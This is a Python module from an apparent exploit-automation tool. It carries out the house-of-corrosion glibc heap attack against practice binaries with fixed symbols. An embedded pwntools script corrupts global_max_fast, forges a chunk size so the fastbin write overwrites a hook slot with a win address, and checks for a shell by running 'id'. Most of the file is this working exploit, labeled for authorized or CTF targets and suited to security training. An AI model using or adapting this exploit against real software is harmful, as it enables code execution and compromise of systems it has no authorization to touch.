"""House-of-corrosion, verified by execution.

House-of-corrosion's core primitive is a controlled RELATIVE WRITE through the fastbins: corrupting
`global_max_fast` to a huge value makes a `free()` of a large chunk be treated as a fastbin free, and
the allocator indexes `fastbinsY[(size-0x20)>>4]` with NO upper bound -- so an attacker-chosen `size`
makes that index alias an arbitrary slot, and the fastbin insertion writes the freed chunk's address
there. In real glibc `global_max_fast` lives in `main_arena` and the write is chained into libc
(_IO_list_all / stdout / hook-era targets); binoracle verifies the technique against a target whose
allocator reproduces the unbounded-fastbin-index write, and degrades honestly otherwise. The sandbox
runs with ASLR off and `heap`/`fastbinsY`/`hook_slot`/`win` are fixed symbols, so the index is
deterministic. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import elf_symbol_names, run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (hoc driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
heap = sym.get("heap")
fastbins = sym.get("fastbinsY") or sym.get("fastbins")
hook = sym.get("hook_slot") or sym.get("slot") or sym.get("target")
win = sym.get("win")
if heap is None or fastbins is None or hook is None or win is None:
    print("NOT_APPLICABLE (no HoC shape: need heap+fastbinsY+hook_slot+win symbols)"); sys.exit(1)

# The write lands in hook_slot.target (hook_slot+0x10). fastbinsY[idx] aliases it when
# &fastbinsY[idx] == hook_slot+0x10, i.e. idx = (hook_slot+0x10 - fastbinsY)/8. The forged chunk
# size S satisfies (S-0x20)>>4 == idx  ->  S = (idx<<4) + 0x20.
target = hook + 0x10
if (target - fastbins) % 8 != 0 or target < fastbins:
    print("NOT_APPLICABLE (hook_slot not fastbin-index aligned)"); sys.exit(1)
idx = (target - fastbins) // 8
S = (idx << 4) + 0x20

MARK = b"BINORACLE_HOC_PWNED"
io = None
try:
    io = process([name], aslr=False)
    io.recvuntil(b"gmf: ")
    io.send(p64(0xffffffffffffffff))      # corrupt global_max_fast -> huge (everything is fastbin)
    io.recvuntil(b"sz: ")
    io.send(p64(S | 1))                   # a's chunk size = S (PREV_INUSE set; masked off by &~0xf)
    io.recvuntil(b"win: ")
    io.send(p64(win))                     # plant win into a's user data
    time.sleep(0.2)
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if (MARK in out) or (b"uid=" in out):
        print("VERIFIED idx=%d S=%#x heap=%#x hook=%#x win=%#x" % (idx, S, heap, hook, win)); sys.exit(0)
except Exception as e:
    try:
        if io: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
'''


def _hoc_applicable(binary: str) -> bool:
    """Chequeo barato: necesita heap fijo, fastbinsY/fastbins, un slot objetivo (hook_slot/slot/
    target) y win()."""
    names = elf_symbol_names(binary)
    if names is None:
        return True
    fastbins = any(n in names for n in ("fastbinsY", "fastbins"))
    hook = any(n in names for n in ("hook_slot", "slot", "target"))
    return "heap" in names and fastbins and hook and "win" in names


def autohoc(binary: str) -> dict:
    """House-of-corrosion verificado por ejecucion (contra un asignador que reproduce la escritura de
    indice de fastbin sin cota al corromper global_max_fast). Necesita la forma de practica
    (heap/fastbinsY/hook_slot/win). Docker o sandbox nativo (ASLR off); degrada limpio."""
    if not _hoc_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin heap + fastbinsY/fastbins + hook_slot/slot/target + win)"}
    res = run_driver(binary, _DRIVER, ".binoracle_hoc.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"house-of-corrosion (global_max_fast corrompido -> escritura de indice de fastbin "
                   f"sin cota -> hijack -> shell): verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"house-of-corrosion: no verificado ({eng}) (sin la forma de practica o timing)")
    return res


def render_hoc(r: dict) -> str:
    out = ["## Auto house-of-corrosion (global_max_fast -> fastbin index write, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: el HoC real corrompe global_max_fast en main_arena y encadena la escritura "
               "relativa hacia libc (_IO_list_all/stdout); la verificacion reproduce la escritura de "
               "indice de fastbin sin cota._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
